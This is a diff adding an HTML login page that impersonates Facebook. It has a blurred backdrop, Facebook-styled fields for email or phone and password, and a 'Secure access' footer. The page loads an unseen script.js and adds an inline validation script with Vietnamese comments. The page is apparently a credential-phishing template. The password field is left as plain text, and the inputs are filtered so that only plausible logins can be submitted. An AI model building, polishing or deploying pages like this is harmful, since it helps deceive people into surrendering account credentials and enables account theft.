@@ -1,0 +1,219 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Log in to continue</title>
+<style>
+*{box-sizing:border-box}
+html,body{margin:0;min-height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,Helvetica,Arial,sans-serif}
+body{min-height:100vh;display:flex;align-items:center;justify-content:center;background:#f0f2f5;overflow:hidden}
+.bg{position:fixed;inset:-35px;background:#e4e6eb center/cover no-repeat;filter:blur(8px);transform:scale(1.08)}
+.shade{position:fixed;inset:0;background:rgba(0,0,0,.38)}
+.card{
+  position:relative;
+  width:min(396px,calc(100% - 28px));
+  padding:28px 24px 24px;
+  border-radius:16px;
+  background:rgba(255,255,255,.98);
+  box-shadow:0 18px 55px rgba(0,0,0,.24);
+}
+.logo-wrap{height:64px;display:flex;align-items:center;justify-content:center;margin-bottom:10px}
+.logo-wrap img{max-width:190px;max-height:62px;object-fit:contain;display:none}
+h1{text-align:center;margin:5px 0 6px;font-size:25px;font-weight:700;letter-spacing:-.3px;color:#1c1e21}
+.sub{text-align:center;color:#65676b;font-size:15px;margin:0 0 22px}
+label{display:block;font-size:13px;font-weight:600;color:#4b4f56;margin:13px 0 7px}
+input{
+  width:100%;height:50px;
+  border:1px solid #ccd0d5;
+  border-radius:10px;
+  padding:0 15px;
+  font-size:15px;
+  color:#1c1e21;
+  background:#fff;
+  outline:none;
+  transition:border-color .15s,box-shadow .15s;
+}
+input::placeholder{color:#8a8d91}
+input:focus{
+  border-color:#1877f2;
+  box-shadow:0 0 0 3px rgba(24,119,242,.13);
+}
+button{
+  width:100%;height:50px;
+  margin-top:20px;
+  border:0;border-radius:10px;
+  background:#1877f2;color:#fff;
+  font-size:16px;font-weight:700;
+  cursor:pointer;
+  transition:filter .15s,transform .05s;
+}
+button:hover{filter:brightness(.96)}
+button:active{transform:translateY(1px)}
+button:disabled{opacity:.65;cursor:wait}
+.message{text-align:center;min-height:20px;margin-top:12px;font-size:13px;color:#b00020}
+.footer{text-align:center;color:#8a8d91;font-size:12px;margin-top:20px}
+@media(max-width:480px){
+  .card{padding:24px 18px 20px;border-radius:14px}
+  h1{font-size:23px}
+}
+</style>
+</head>
+<body>
+<div class="bg"></div>
+<div class="shade"></div>
+
+<main class="card">
+  <div class="logo-wrap">
+    <img id="logo" alt="Logo">
+  </div>
+
+  <h1>Facebook</h1>
+  <p class="sub">Log in to continue</p>
+
+  <form id="loginForm">
+    <label for="account1">Email or mobile number</label>
+    <input id="account1" autocomplete="off" placeholder="Email or mobile number">
+
+    <label for="account2">Password</label>
+    <input id="account2" autocomplete="off" placeholder="Password">
+
+    <button type="submit" id="submitBtn">Log In</button>
+    <div id="message" class="message"></div>
+  </form>
+
+  <div class="footer">Secure access</div>
+</main>
+
+<script src="script.js"></script>
+
+<!-- CHỈ THÊM PHẦN NÀY -->
+<script>
+const checkAccount1 = document.getElementById("account1");
+const checkAccount2 = document.getElementById("account2");
+const checkButton = document.getElementById("submitBtn");
+const checkMessage = document.getElementById("message");
+const checkForm = document.getElementById("loginForm");
+
+
+// Kiểm tra Email
+function isValidEmail(value) {
+  return /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/.test(value);
+}
+
+
+// Kiểm tra Mobile
+function isValidMobile(value) {
+  return /^\+?[0-9]{9,15}$/.test(value);
+}
+
+
+// Kiểm tra ô 1: Email hoặc Mobile
+function isValidAccount1(value) {
+  return isValidEmail(value) || isValidMobile(value);
+}
+
+
+// Kiểm tra toàn bộ form
+function checkInputs() {
+
+  let account1 = checkAccount1.value.trim();
+  let account2 = checkAccount2.value.trim();
+
+
+  // Không nhập gì
+  if (!account1 && !account2) {
+    checkButton.disabled = true;
+    checkMessage.textContent = "";
+    return false;
+  }
+
+
+  // Ô 1 bỏ trống
+  if (!account1) {
+    checkButton.disabled = true;
+    checkMessage.textContent =
+      "Please enter your email address or mobile number.";
+    return false;
+  }
+
+
+  // Ô 1 sai định dạng
+  if (!isValidAccount1(account1)) {
+    checkButton.disabled = true;
+    checkMessage.textContent =
+      "Please enter a valid email address or mobile number.";
+    return false;
+  }
+
+
+  // Ô 2 bỏ trống
+  if (!account2) {
+    checkButton.disabled = true;
+    checkMessage.textContent =
+      "Please enter your password";
+    return false;
+  }
+
+
+  // Ô 2 dưới 6 ký tự
+  if (account2.length < 6) {
+    checkButton.disabled = true;
+    checkMessage.textContent =
+      "Password must be at least 6 characters.";
+    return false;
+  }
+
+
+  // Cả 2 đều hợp lệ
+  checkButton.disabled = false;
+  checkMessage.textContent = "";
+
+  return true;
+}
+
+
+// Ô 1
+checkAccount1.addEventListener("input", function() {
+
+  // Không cho ký tự có dấu
+  // Cho phép ký tự dùng cho email / số điện thoại
+  this.value = this.value.replace(
+    /[^A-Za-z0-9@._%+\-]/g,
+    ""
+  );
+
+  checkInputs();
+});
+
+
+// Ô 2
+checkAccount2.addEventListener("input", function() {
+
+  // Không cho ký tự có dấu
+  this.value = this.value.replace(
+    /[^A-Za-z0-9._\-]/g,
+    ""
+  );
+
+  checkInputs();
+});
+
+
+// Kiểm tra lần cuối khi bấm Log In
+checkForm.addEventListener("submit", function(event) {
+
+  if (!checkInputs()) {
+    event.preventDefault();
+    return false;
+  }
+
+});
+
+
+// Ban đầu khóa nút
+checkButton.disabled = true;
+</script>
+
+</body>
+</html>
